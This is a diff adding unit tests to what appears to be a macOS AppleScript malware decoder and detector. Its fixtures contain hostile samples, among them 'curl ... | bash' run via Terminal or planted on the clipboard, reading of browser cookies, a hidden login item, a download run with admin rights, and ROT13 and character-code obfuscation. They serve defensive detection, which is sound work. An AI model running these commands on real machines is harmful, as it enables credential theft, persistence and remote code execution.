@@ -11,6 +11,12 @@ describe('looksLikeAppleScript', () => {
   it('does not flag JXA `doShellScript` (camelCase, no spaces)', () => {
     expect(looksLikeAppleScript('app.doShellScript("x")')).toBe(false);
   });
+  it('ignores AppleScript keywords that only appear inside a JS string literal', () => {
+    expect(looksLikeAppleScript('var note="tell application to relax";eval(atob("x"))')).toBe(false);
+  });
+  it('detects a bare `set the clipboard to` with no `tell application`/`do shell script` alongside it', () => {
+    expect(looksLikeAppleScript('set the clipboard to "curl -fsSL https://example.com/install.sh | bash"')).toBe(true);
+  });
 });
 
 describe('decodeAppleScript', () => {
@@ -146,5 +152,150 @@ describe('target-artifact enumeration', () => {
 
   it('yields targets: [] when source has no {{...}} blocks', () => {
     expect(decodeAppleScript('do shell script "echo hello"').targets).toEqual([]);
+  });
+});
+
+describe('browser-injection sink', () => {
+  it('captures `do JavaScript … in` as a browser-injection event', () => {
+    const src = ['tell application "Safari"', '\tdo JavaScript "document.cookie" in front document', 'end tell'].join('\n');
+    const r = decodeAppleScript(src);
+    expect(r.events.some((e) => e.kind === 'browser-injection' && e.detail === 'document.cookie')).toBe(true);
+    expect(r.capturedStrings).toContain('document.cookie');
+  });
+});
+
+describe('gui-scripting sink', () => {
+  it('captures a `keystroke` as a gui-scripting event', () => {
+    const src = [
+      'tell application "System Events"',
+      '\ttell process "SecurityAgent"',
+      '\t\tkeystroke "AdminPassword123"',
+      '\t\tclick button "OK" of window 1',
+      '\tend tell',
+      'end tell',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(r.events.some((e) => e.kind === 'gui-scripting' && e.detail === 'keystroke AdminPassword123')).toBe(true);
+  });
+});
+
+describe('login-item persistence sink', () => {
+  it('captures `make new login item` as a login-item event', () => {
+    const src = [
+      'tell application "System Events"',
+      '\tmake new login item at end of login items with properties {path:"/tmp/x.app", hidden:true}',
+      'end tell',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(
+      r.events.some(
+        (e) => e.kind === 'login-item' && e.detail.startsWith('make new login item at end of login items'),
+      ),
+    ).toBe(true);
+  });
+});
+
+describe('Terminal.app do-script sink', () => {
+  it('captures `do script` as a terminal-app event and a shell-recursable capture (#57)', () => {
+    const src = [
+      'tell application "Terminal"',
+      '\tdo script "curl -fsSL https://example.com/install.sh | bash"',
+      'end tell',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(
+      r.events.some(
+        (e) => e.kind === 'terminal-app' && e.detail === 'Terminal do script curl -fsSL https://example.com/install.sh | bash',
+      ),
+    ).toBe(true);
+    expect(r.capturedStrings).toContain('curl -fsSL https://example.com/install.sh | bash');
+  });
+});
+
+describe('clipboard-injection sink', () => {
+  it('captures `set the clipboard to` as a clipboard-write event (#56)', () => {
+    const src = 'set the clipboard to "curl -fsSL https://example.com/install.sh | bash"';
+    const r = decodeAppleScript(src);
+    expect(
+      r.events.some(
+        (e) => e.kind === 'clipboard-write' && e.detail === 'set the clipboard to curl -fsSL https://example.com/install.sh | bash',
+      ),
+    ).toBe(true);
+  });
+});
+
+describe('Mail.app outgoing-message sink', () => {
+  it('captures `make new outgoing message` as a mail-compose event (#63)', () => {
+    const src = [
+      'tell application "Mail"',
+      '\tset newMessage to make new outgoing message with properties {subject:"data", content:"stolen secrets"}',
+      '\tsend newMessage',
+      'end tell',
+    ].join('\n');
+    const r = decodeAppleScript(src);
+    expect(
+      r.events.some(
+        (e) => e.kind === 'mail-compose' && e.detail.startsWith('make new outgoing message with properties'),
+      ),
+    ).toBe(true);
+  });
+});
+
+describe('ASCII character arithmetic', () => {
+  it('resolves `ASCII character N` string-building to the real command (#46)', () => {
+    const src = [
+      'set c1 to ASCII character 111',
+      'set c2 to ASCII character 112',
+      'set c3 to ASCII character 101',
+      'set c4 to ASCII character 110',
+      'set cmd to c1 & c2 & c3 & c4 & " /tmp/x"',
+      'do shell script cmd',
+    ].join('\n');
+    expect(decodeAppleScript(src).capturedStrings).toContain('open /tmp/x');
+  });
+
+  it('also resolves the `character id N` spelling', () => {
+    const src = 'set c to character id 104\ndo shell script c';
+    expect(decodeAppleScript(src).capturedStrings).toContain('h');
+  });
+});
+
+describe('credential-supplying do shell script', () => {
+  it('resolves the command cleanly and surfaces `user name … password …` separately (#48)', () => {
+    const src = 'do shell script "curl -o /tmp/update https://198.51.100.7/zxc/app" user name "admin" password pwd with administrator privileges';
+    const r = decodeAppleScript(src);
+    expect(r.capturedStrings).toContain('curl -o /tmp/update https://198.51.100.7/zxc/app');
+    expect(r.events.some((e) =>
+      e.kind === 'shell' &&
+      e.detail.includes('curl -o /tmp/update https://198.51.100.7/zxc/app') &&
+      e.detail.includes('credentials supplied') &&
+      e.detail.includes('user name admin') &&
+      e.detail.includes('password <pwd>')
+    )).toBe(true);
+  });
+});
+
+describe('shell-cipher resolution', () => {
+  it('resolves an `echo … | tr SET1 SET2` ROT13 pipe to plaintext (#40)', () => {
+    const src = `do shell script "echo 'bcra uggcf://rknzcyr.pbz/oravta/ge-bx' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"`;
+    expect(decodeAppleScript(src).capturedStrings).toContain('open https://example.com/benign/tr-ok');
+  });
+
+  it('leaves an ordinary do-shell-script command unchanged (not this exact tr-pipe shape)', () => {
+    const r = decodeAppleScript('do shell script "echo hi"');
+    expect(r.capturedStrings).toContain('echo hi');
+  });
+
+  it('composes with the credential-supplying user-name/password clause', () => {
+    const src = `do shell script "echo 'bcra uggcf://rknzcyr.pbz/oravta/ge-bx' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" user name "admin" password pwd with administrator privileges`;
+    const r = decodeAppleScript(src);
+    expect(r.capturedStrings).toContain('open https://example.com/benign/tr-ok');
+    expect(r.events.some((e) =>
+      e.kind === 'shell' &&
+      e.detail.includes('open https://example.com/benign/tr-ok') &&
+      e.detail.includes('credentials supplied') &&
+      e.detail.includes('user name admin') &&
+      e.detail.includes('password <pwd>')
+    )).toBe(true);
   });
 });
